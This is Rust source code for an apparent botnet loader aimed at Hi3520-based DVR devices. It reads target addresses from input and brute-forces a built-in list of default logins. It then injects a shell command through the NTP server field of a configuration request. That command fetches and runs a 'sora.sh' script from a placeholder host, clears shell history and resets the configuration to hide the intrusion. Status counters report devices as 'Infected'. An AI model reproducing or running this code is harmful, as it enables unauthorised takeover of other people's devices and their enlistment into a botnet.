use base64::{engine::general_purpose, Engine as _};
use clap::Parser;
use colored::*;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::sync::atomic::{AtomicI32, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use qassam::support::qassam_support::{
    qassam_get_string_in_between, qassam_set_read_timeout, qassam_set_write_timeout,
    qassam_zero_byte,
};

#[derive(Parser, Debug)]
#[command(author, version, about)]
pub struct QassamArgs {
    #[arg(index = 1)]
    pub port: String,
}

// Global variables (atomic for thread safety)
pub static QASSAM_DVRT_STATUS_ATTEMPTED: AtomicI32 = AtomicI32::new(0);
pub static QASSAM_DVRT_STATUS_LOGINS: AtomicI32 = AtomicI32::new(0);
pub static QASSAM_DVRT_STATUS_FOUND: AtomicI32 = AtomicI32::new(0);
pub static QASSAM_DVRT_STATUS_VULN: AtomicI32 = AtomicI32::new(0);
pub static QASSAM_DVRT_STATUS_CLEAN: AtomicI32 = AtomicI32::new(0);

// Constants
pub const QASSAM_DVRT_CONNECT_TIMEOUT: Duration = Duration::from_secs(30);
pub const QASSAM_DVRT_READ_TIMEOUT: Duration = Duration::from_secs(20);
pub const QASSAM_DVRT_WRITE_TIMEOUT: Duration = Duration::from_secs(20);
pub const QASSAM_DVRT_CNT_LEN: usize = 292;

// Configuration structure
pub const QASSAM_DVRT_PAYLOAD: &str = "cd /tmp || cd /run || cd /; wget http://YOURIP/sora.sh; chmod 777 sora.sh; sh sora.sh; rm -rf sora.sh; history -c";
pub const QASSAM_DVRT_PATHS: &[&str] = &["/dvr/cmd", "/cn/cmd"];
pub const QASSAM_DVRT_LOGINS: &[&str] = &[
    "admin:686868",
    "admin:baogiaan",
    "admin:555555",
    "admin123:admin123",
    "admin:888888",
    "root:toor",
    "toor:toor",
    "toor:root",
    "admin:admin@123",
    "admin:123456789",
    "root:admin",
    "guest:guest",
    "guest:123456",
    "report:8Jg0SR8K50",
    "admin:admin",
    "admin:123456",
    "root:123456",
    "admin:user",
    "admin:1234",
    "admin:password",
    "admin:12345",
    "admin:0000",
    "admin:1111",
    "admin:1234567890",
    "admin:123",
    "admin:",
    "admin:666666",
    "admin:admin123",
    "admin:administrator",
    "administartor:password",
    "admin:p@ssword",
];

// Process target
fn qassam_process_target(
    target: String,
    cnt_len_string: String,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut auth_pos: Option<usize> = None;
    let mut path_pos: Option<usize> = None;
    // Increasing the attempt counter
    QASSAM_DVRT_STATUS_ATTEMPTED.fetch_add(1, Ordering::Relaxed);

    // Connecting to the goal
    let mut stream = TcpStream::connect_timeout(
        &target
            .to_socket_addrs()?
            .next()
            .ok_or("[ ETA ]: Invalid address")?,
        QASSAM_DVRT_CONNECT_TIMEOUT,
    )?;

    // Setting timeouts
    qassam_set_write_timeout(&stream, QASSAM_DVRT_WRITE_TIMEOUT)?;
    qassam_set_read_timeout(&stream, QASSAM_DVRT_READ_TIMEOUT)?;

    // Sending a GET request
    let request = format!(
        "GET / HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: Linux Gnu (cow) \r\n\
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n\
         Accept-Language: en-GB,en;q=0.5\r\n\
         Accept-Encoding: gzip, deflate\r\n\
         Connection: close\r\n\
         Upgrade-Insecure-Requests: 1\r\n\r\n",
        target
    );
    stream.write_all(request.as_bytes())?;
    // Reading the answer
    let mut bytebuf = vec![0u8; 512];
    let l = stream.read(&mut bytebuf)?;

    if l > 0
        && String::from_utf8_lossy(&bytebuf).contains("401 Unauthorized")
        && String::from_utf8_lossy(&bytebuf).contains("Basic realm=")
    {
        QASSAM_DVRT_STATUS_FOUND.fetch_add(1, Ordering::Relaxed);
    } else {
        qassam_zero_byte(&mut bytebuf);
        stream.shutdown(std::net::Shutdown::Both)?;
        return Ok(());
    }
    qassam_zero_byte(&mut bytebuf);
    stream.shutdown(std::net::Shutdown::Both)?;

    // Trying logins
    for (i, login) in QASSAM_DVRT_LOGINS.iter().enumerate() {
        let mut stream = TcpStream::connect_timeout(
            &target
                .to_socket_addrs()?
                .next()
                .ok_or("[ ETA ]: Invalid address")?,
            QASSAM_DVRT_CONNECT_TIMEOUT,
        )?;

        // Setting timeouts
        qassam_set_write_timeout(&stream, QASSAM_DVRT_WRITE_TIMEOUT)?;
        qassam_set_read_timeout(&stream, QASSAM_DVRT_READ_TIMEOUT)?;

        // Sending a GET request
        let request = format!(
            "GET / HTTP/1.1\r\n\
             Host: {}\r\n\
             User-Agent: Linux Gnu (cow) \r\n\
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n\
             Accept-Language: en-GB,en;q=0.5\r\n\
             Accept-Encoding: gzip, deflate\r\n\
             Connection: close\r\n\
             Upgrade-Insecure-Requests: 1\r\n\
             Authorization: Basic {}\r\n\r\n",
            target, login
        );
        stream.write_all(request.as_bytes())?;
        let mut bytebuf = vec![0u8; 2048];
        let l = stream.read(&mut bytebuf)?;

        if l > 0
            && (String::from_utf8_lossy(&bytebuf).contains("HTTP/1.1 200")
                || String::from_utf8_lossy(&bytebuf).contains("HTTP/1.0 200"))
        {
            QASSAM_DVRT_STATUS_LOGINS.fetch_add(1, Ordering::Relaxed);
            auth_pos = Some(i);
            qassam_zero_byte(&mut bytebuf);
            stream.shutdown(std::net::Shutdown::Both)?;
            break;
        } else {
            qassam_zero_byte(&mut bytebuf);
            stream.shutdown(std::net::Shutdown::Both)?;
            continue;
        }
    }
    // If you haven't found the correct login, exit.
    let auth_pos = match auth_pos {
        Some(pos) => pos,
        None => return Ok(()),
    };

    // Trying exploit paths
    for (i, path) in QASSAM_DVRT_PATHS.iter().enumerate() {
        let mut stream = TcpStream::connect_timeout(
            &target
                .to_socket_addrs()?
                .next()
                .ok_or("[ ETA ]: Invalid address")?,
            QASSAM_DVRT_CONNECT_TIMEOUT,
        )?;
        qassam_set_write_timeout(&stream, QASSAM_DVRT_WRITE_TIMEOUT)?;
        qassam_set_read_timeout(&stream, QASSAM_DVRT_READ_TIMEOUT)?;

        let request = format!(
            "POST {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Accept-Encoding: gzip, deflate\r\n\
             Content-Length: {}\r\n\
             Authorization: Basic {}\r\n\
             User-Agent: Linux Gnu (cow) \r\n\r\n\
             <?xml version=\"1.0\" encoding=\"UTF-8\"?>\
             <DVR Platform=\"Hi3520\">\
             <SetConfiguration File=\"service.xml\">\
             <![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
             <DVR Platform=\"Hi3520\">\
             <Service>\
             <NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov&{};echo DONE\"/>\
             </Service>\
             </DVR>]]>\
             </SetConfiguration>\
             </DVR>\r\n\r\n",
            path, target, cnt_len_string, QASSAM_DVRT_LOGINS[auth_pos], QASSAM_DVRT_PAYLOAD
        );
        stream.write_all(request.as_bytes())?;
        // Wait 10 seconds
        thread::sleep(Duration::from_secs(10));
        let mut bytebuf = vec![0u8; 2048];
        let l = stream.read(&mut bytebuf)?;

        if l > 0
            && (String::from_utf8_lossy(&bytebuf).contains("HTTP/1.1 200")
                || String::from_utf8_lossy(&bytebuf).contains("HTTP/1.0 200"))
        {
            path_pos = Some(i);
            QASSAM_DVRT_STATUS_VULN.fetch_add(1, Ordering::Relaxed);
            qassam_zero_byte(&mut bytebuf);
            stream.shutdown(std::net::Shutdown::Both)?;
            break;
        } else {
            qassam_zero_byte(&mut bytebuf);
            stream.shutdown(std::net::Shutdown::Both)?;
            continue;
        }
    }

    // If we find a vulnerable path, we clean it
    if let Some(path_pos) = path_pos {
        let mut stream = TcpStream::connect_timeout(
            &target
                .to_socket_addrs()?
                .next()
                .ok_or("[ ETA ]: Invalid address")?,
            QASSAM_DVRT_CONNECT_TIMEOUT,
        )?;
        qassam_set_write_timeout(&stream, QASSAM_DVRT_WRITE_TIMEOUT)?;
        qassam_set_read_timeout(&stream, QASSAM_DVRT_READ_TIMEOUT)?;

        let request = format!(
            "POST {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Accept-Encoding: gzip, deflate\r\n\
             Content-Length: 281\r\n\
             Authorization: Basic {}\r\n\
             User-Agent: Linux Gnu (cow) \r\n\r\n\
             <?xml version=\"1.0\" encoding=\"UTF-8\"?>\
             <DVR Platform=\"Hi3520\">\
             <SetConfiguration File=\"service.xml\">\
             <![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
             <DVR Platform=\"Hi3520\">\
             <Service>\
             <NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov\"/>\
             </Service>\
             </DVR>]]>\
             </SetConfiguration>\
             </DVR>\r\n\r\n",
            QASSAM_DVRT_PATHS[path_pos], target, QASSAM_DVRT_LOGINS[auth_pos]
        );
        stream.write_all(request.as_bytes())?;
        let mut bytebuf = vec![0u8; 2048];
        let l = stream.read(&mut bytebuf)?;

        if l > 0
            && (String::from_utf8_lossy(&bytebuf).contains("HTTP/1.1 200")
                || String::from_utf8_lossy(&bytebuf).contains("HTTP/1.0 200"))
        {
            QASSAM_DVRT_STATUS_CLEAN.fetch_add(1, Ordering::Relaxed);
        }
        qassam_zero_byte(&mut bytebuf);
        stream.shutdown(std::net::Shutdown::Both)?;
    }
    Ok(())
}

// Print statistics
pub fn qassam_print_stats() {
    let mut i = 0;

    loop {
        println!(
            "[ ETA ]: {}'s |{} Total [{}] |{} Device: [{}] |{} Verify: [{}] |{} Infected: [{}] |{} Cleaned: [{}]",
            i,
            "INFO".blue(),QASSAM_DVRT_STATUS_ATTEMPTED.load(Ordering::Relaxed),
            "SUCCESS".green(),QASSAM_DVRT_STATUS_FOUND.load(Ordering::Relaxed),
            "VERIFY".yellow(),QASSAM_DVRT_STATUS_LOGINS.load(Ordering::Relaxed),
            "INFECTED".red(),QASSAM_DVRT_STATUS_VULN.load(Ordering::Relaxed),
            "CLEANED".green(),QASSAM_DVRT_STATUS_CLEAN.load(Ordering::Relaxed)
        );
        thread::sleep(Duration::from_secs(1));
        i += 1;
    }
}

// Main function
fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Parsing command line arguments
    let args: Vec<String> = std::env::args().collect();

    if args.len() != 2 {
        eprintln!("[ ETA ]: Missing argument (port/listen)");
        std::process::exit(1);
    }
    // КEncode logins in base64
    let encoded_logins = QASSAM_DVRT_LOGINS
        .iter()
        .map(|login| general_purpose::STANDARD.encode(login))
        .collect::<Vec<_>>();
    // Calculating content length
    let cnt_len = QASSAM_DVRT_CNT_LEN + QASSAM_DVRT_PAYLOAD.len();
    let cnt_len_string = cnt_len.to_string();
    // We launch a stream to output statistics
    thread::spawn(qassam_print_stats);
    // Main target reading loop
    let stdin = std::io::stdin();
    let mut line = String::new();

    loop {
        line.clear();
        match stdin.read_line(&mut line) {
            Ok(0) => break, // EOF
            Ok(_) => {
                let target = line.trim().to_string();

                if target.is_empty() {
                    continue;
                }
                let target_with_port = if args[1] == "listen" {
                    target
                } else {
                    format!("{}:{}", target, args[1])
                };
                let cnt_len_string_clone = cnt_len_string.clone();

                thread::spawn(move || {
                    if let Err(e) = qassam_process_target(target_with_port, cnt_len_string_clone) {
                        eprintln!("[ ETA ]: Error processing target: {}", e);
                    }
                });
            }
            Err(error) => {
                eprintln!("[ ETA ]: Error reading line: {}", error);
                break;
            }
        }
    }
    Ok(())
}

pub fn qassam_get_stats() -> HashMap<&'static str, i32> {
    let mut stats = HashMap::new();
    stats.insert(
        "attempted",
        QASSAM_DVRT_STATUS_ATTEMPTED.load(Ordering::Relaxed),
    );
    stats.insert("found", QASSAM_DVRT_STATUS_FOUND.load(Ordering::Relaxed));
    stats.insert("logins", QASSAM_DVRT_STATUS_LOGINS.load(Ordering::Relaxed));
    stats.insert("vuln", QASSAM_DVRT_STATUS_VULN.load(Ordering::Relaxed));
    stats.insert("clean", QASSAM_DVRT_STATUS_CLEAN.load(Ordering::Relaxed));
    stats
}

pub fn qassam_reset_counters() {
    QASSAM_DVRT_STATUS_ATTEMPTED.store(0, Ordering::Relaxed);
    QASSAM_DVRT_STATUS_FOUND.store(0, Ordering::Relaxed);
    QASSAM_DVRT_STATUS_LOGINS.store(0, Ordering::Relaxed);
    QASSAM_DVRT_STATUS_VULN.store(0, Ordering::Relaxed);
    QASSAM_DVRT_STATUS_CLEAN.store(0, Ordering::Relaxed);
}

#[cfg(test)]
mod tests {
    use super::*;
    use mockall::predicate::*;
    use std::sync::atomic::Ordering;
    use std::time::Duration;

    #[test]
    fn test_zero_byte() {
        let mut buf = vec![1, 2, 3, 4, 5];
        qassam_zero_byte(&mut buf);
        assert_eq!(buf, vec![0, 0, 0, 0, 0]);
    }

    #[test]
    fn test_constants() {
        assert_eq!(QASSAM_DVRT_CONNECT_TIMEOUT, Duration::from_secs(30));
        assert_eq!(QASSAM_DVRT_READ_TIMEOUT, Duration::from_secs(20));
        assert_eq!(QASSAM_DVRT_WRITE_TIMEOUT, Duration::from_secs(20));
        assert_eq!(QASSAM_DVRT_CNT_LEN, 292);
        assert!(!QASSAM_DVRT_PAYLOAD.is_empty());
        assert!(!QASSAM_DVRT_PATHS.is_empty());
        assert!(!QASSAM_DVRT_LOGINS.is_empty());
    }

    #[test]
    fn test_get_stats_initial() {
        QASSAM_DVRT_STATUS_ATTEMPTED.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_FOUND.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_LOGINS.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_VULN.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_CLEAN.store(0, Ordering::Relaxed);

        let stats = qassam_get_stats();

        assert_eq!(stats.get("attempted"), Some(&0));
        assert_eq!(stats.get("found"), Some(&0));
        assert_eq!(stats.get("logins"), Some(&0));
        assert_eq!(stats.get("vuln"), Some(&0));
        assert_eq!(stats.get("clean"), Some(&0));
    }

    #[test]
    fn test_stats_increment() {
        QASSAM_DVRT_STATUS_ATTEMPTED.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_FOUND.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_LOGINS.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_VULN.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_CLEAN.store(0, Ordering::Relaxed);

        QASSAM_DVRT_STATUS_ATTEMPTED.fetch_add(1, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_FOUND.fetch_add(1, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_LOGINS.fetch_add(1, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_VULN.fetch_add(1, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_CLEAN.fetch_add(1, Ordering::Relaxed);

        let stats = qassam_get_stats();

        assert_eq!(stats.get("attempted"), Some(&1));
        assert_eq!(stats.get("found"), Some(&1));
        assert_eq!(stats.get("logins"), Some(&1));
        assert_eq!(stats.get("vuln"), Some(&1));
        assert_eq!(stats.get("clean"), Some(&1));
    }

    // #[test]
    // fn test_process_target_mock() {
    //     let mut mock_stream = MockTcpStream::new();
    //     mock_stream.expect_write()
    //         .times(1)
    //         .returning(|buf| Ok(buf.len()));
    //     mock_stream.expect_read()
    //         .times(1)
    //         .returning(|buf| {
    //             buf[0] = b'H';
    //             buf[1] = b'T';
    //             buf[2] = b'T';
    //             buf[3] = b'P';
    //             buf[4] = b'/';
    //             buf[5] = b'1';
    //             buf[6] = b'.';
    //             buf[7] = b'1';
    //             buf[8] = b' ';
    //             buf[9] = b'2';
    //             buf[10] = b'0';
    //             buf[11] = b'0';
    //             buf[12] = b' ';
    //             buf[13] = b'O';
    //             buf[14] = b'K';
    //             buf[15] = b'\r';
    //             buf[16] = b'\n';
    //             Ok(17)
    //         });
    //
    //     let ctx = MockTcpStreamFunctions::connect_timeout_context();
    //     ctx.expect()
    //         .times(1)
    //         .returning(|_, _| Ok(mock_stream));
    //
    //     // let result = qassam_process_target("127.0.0.1:80".to_string(), "292".to_string());
    //     // assert!(result.is_ok());
    // }

    #[test]
    fn test_thread_safety() {
        use std::thread;

        QASSAM_DVRT_STATUS_ATTEMPTED.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_FOUND.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_LOGINS.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_VULN.store(0, Ordering::Relaxed);
        QASSAM_DVRT_STATUS_CLEAN.store(0, Ordering::Relaxed);

        let handles: Vec<_> = (0..10)
            .map(|_| {
                thread::spawn(|| {
                    for _ in 0..100 {
                        QASSAM_DVRT_STATUS_ATTEMPTED.fetch_add(1, Ordering::Relaxed);
                        QASSAM_DVRT_STATUS_FOUND.fetch_add(1, Ordering::Relaxed);
                        QASSAM_DVRT_STATUS_LOGINS.fetch_add(1, Ordering::Relaxed);
                        QASSAM_DVRT_STATUS_VULN.fetch_add(1, Ordering::Relaxed);
                        QASSAM_DVRT_STATUS_CLEAN.fetch_add(1, Ordering::Relaxed);
                    }
                })
            })
            .collect();

        for handle in handles {
            handle.join().unwrap();
        }

        let stats = qassam_get_stats();
        assert_eq!(stats.get("attempted"), Some(&1000));
        assert_eq!(stats.get("found"), Some(&1000));
        assert_eq!(stats.get("logins"), Some(&1000));
        assert_eq!(stats.get("vuln"), Some(&1000));
        assert_eq!(stats.get("clean"), Some(&1000));
    }

    #[test]
    fn test_config_data() {
        assert!(QASSAM_DVRT_LOGINS.contains(&"admin:686868"));
        assert!(QASSAM_DVRT_LOGINS.contains(&"root:toor"));
        assert!(QASSAM_DVRT_PATHS.contains(&"/dvr/cmd"));
        assert!(QASSAM_DVRT_PATHS.contains(&"/cn/cmd"));

        let mut seen = std::collections::HashSet::new();
        for login in QASSAM_DVRT_LOGINS {
            assert!(seen.insert(login), "Duplicate login found: {}", login);
        }
    }

    #[test]
    fn test_payload_content() {
        // Проверяем ключевые части payload
        assert!(QASSAM_DVRT_PAYLOAD.contains("cd /tmp"));
        assert!(QASSAM_DVRT_PAYLOAD.contains("wget"));
        assert!(QASSAM_DVRT_PAYLOAD.contains("sora.sh"));
        assert!(QASSAM_DVRT_PAYLOAD.contains("chmod 777"));
        assert!(QASSAM_DVRT_PAYLOAD.contains("history -c"));
    }

    #[test]
    fn test_logins_format() {
        for login in QASSAM_DVRT_LOGINS {
            assert!(login.contains(':'), "Login '{}' should contain ':'", login);
            let parts: Vec<&str> = login.split(':').collect();
            assert_eq!(
                parts.len(),
                2,
                "Login '{}' should have exactly one ':'",
                login
            );
            assert!(
                !parts[0].is_empty(),
                "Username in '{}' should not be empty",
                login
            );
            // Пароль может быть пустым, это допустимо
        }
    }

    #[test]
    fn test_paths_format() {
        for path in QASSAM_DVRT_PATHS {
            assert!(
                path.starts_with('/'),
                "Path '{}' should start with '/'",
                path
            );
            assert!(!path.is_empty(), "Path should not be empty");
        }
    }
}
